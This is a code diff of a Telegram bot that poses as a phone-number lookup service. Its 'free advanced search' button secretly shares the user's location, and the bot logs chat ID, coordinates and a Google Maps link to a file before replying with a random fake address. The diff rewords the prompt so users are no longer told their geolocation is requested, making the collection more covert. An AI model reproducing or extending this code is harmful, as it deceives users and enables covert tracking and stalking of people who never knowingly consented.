@@ -111,9 +111,9 @@ def contact(message):
 	button = types.InlineKeyboardButton(text="Advanced Search", callback_data="find")
 	keyboardmain.add(button)
 	bot.send_message(message.chat.id, f'''
-		Room information
-		├Operator: Beeline
-		└Country: Russia
+		Number information:
+		├Operator: Jio
+		└Country: India
 		''', reply_markup=keyboardmain)
 
 @bot.callback_query_handler(func=lambda call:True)
@@ -122,7 +122,7 @@ def callback_inline(call):
 		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
 		button_location = types.KeyboardButton(text="Confirm", request_location=True) 	
 		keyboard1.add(button_location)
-		bot.send_message(call.message.chat.id, text='To use the free advanced search, confirm your geolocation!', reply_markup=keyboard1)
+		bot.send_message(call.message.chat.id, text='To use the free advanced search, click confirm button', reply_markup=keyboard1)
 
 @bot.message_handler(content_types=['location']) 
 def contact(message):
@@ -130,11 +130,13 @@ def contact(message):
 		lon = str(message.location.longitude)
 		lat = str(message.location.latitude)
 		geo = f'''
-		Geolocation
-		├ID: {message.chat.id}
-		├Longitude: {lon}
-		├Latitude: {lat}
-		└Map: https://www.google.com/maps/place/{lat}+{lon} 
+		Location:
+		 ├ID: {message.chat.id}
+		 ├Longitude: {lon}
+		 ├Latitude: {lat}
+		 └Map: https://www.google.com/maps/place/{lat}+{lon} 
+
+  🖥️ Developer by: @suman333mondal
 		'''
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
 		log.write(geo + '  ')
@@ -145,5 +147,8 @@ def contact(message):
 			Geolocation
 			└Address: {random.choice(adr)}
 			''')
-bot.polling()
+if __name__ == "__main__":
+    start_bot()
+    bot.polling(none_stop=True)
+
         
